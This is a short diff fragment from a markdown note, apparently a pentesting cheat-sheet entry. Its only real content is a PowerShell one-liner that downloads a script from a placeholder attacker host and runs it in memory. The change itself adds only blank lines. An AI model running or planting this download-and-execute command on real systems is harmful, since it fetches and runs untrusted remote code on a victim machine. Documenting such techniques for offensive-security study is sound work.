@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 ```powershell
 echo iex(new-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1") | powershell -noprofile -
 ```
+
+
